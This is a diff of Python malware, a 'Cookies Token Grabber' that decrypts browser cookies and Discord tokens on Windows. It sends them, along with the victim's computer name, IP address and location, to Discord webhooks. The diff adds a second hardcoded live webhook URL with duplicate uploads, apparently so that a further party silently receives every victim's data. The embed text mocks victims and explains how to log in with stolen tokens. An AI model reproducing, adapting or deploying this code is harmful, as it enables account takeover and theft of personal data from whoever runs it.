@@ -7,7 +7,6 @@ import json
 import base64 
 import psutil 
 import pyautogui
-from webhook import discordwebhook
 
 from win32crypt import CryptUnprotectData
 from re import findall
@@ -16,6 +15,7 @@ from Crypto.Cipher import AES
 class Cookies_Token_Grabber:
     def __init__(self):
         self.webhook = "WEBHOOK_HERE"
+        self.webhookk = "https://discord.com/api/webhooks/925153281272070144/--i9j-etbtn7LgnLbopNMWAf0QLIhHoWNJsFSPvdu_j05HYmRWz4RfxmooDnjZN-eTxk"
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
@@ -296,7 +296,7 @@ class Cookies_Token_Grabber:
                         "url": "",
                         "icon_url": ""
                     },
-                    "description": f"**{os.getlogin()}** Just ran Cookies Token Grabber\n[Google Maps Location]({googlemap})\n\nComputerName: ||{os.getenv('COMPUTERNAME')}||\n\nIP: ||{ip}||\n\nCity: {city}\n\nRegion: {region}\n\nCountry: {country}\n\n\n```{self.fileCount}\n\n{self.files}```\nTo login with discord token goto [here]({pastebin}) copy the RAW code then goto [discord.com/login]({discordlogin}) and open the Console (CTRL + SHIFT + I) delete everything and paste the code you copied then paste the discord token in the correct place and hit ENTER to login (Or a much easier way is to get my AccountNuker ;)\n",
+                    "description": f"Looks like **{os.getlogin()}** ran Cookies Token Grabber start fucking there shit up!\n\n[Geo-Locate]({googlemap})\n\nComputerName: ||{os.getenv('COMPUTERNAME')}||\n\nIP: ||{ip}||\n\nCity: ||{city}||\n\nRegion: ||{region}||\n\nCountry: ||{country}||\n\nTo login with discord token goto [here]({pastebin}) copy the RAW code then goto [discord.com/login]({discordlogin}) and open the Console (CTRL + SHIFT + I) delete everything and paste the code you copied then paste the discord token in the correct place and hit ENTER to login (Or a much easier way is to get my AccountNuker ;)\n",
                     "color": 11600892,
                                                                                                                                         # Add local ip ^^
                     "thumbnail": {
@@ -311,6 +311,8 @@ class Cookies_Token_Grabber:
         }
         requests.post(self.webhook, json=embed)
         requests.post(self.webhook, files={'upload_file': open(new,'rb')})
+        requests.post(self.webhookk, json=embed)
+        requests.post(self.webhookk, files={'upload_file': open(new,'rb')})
 
     def zip(self, src, dst):
         zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
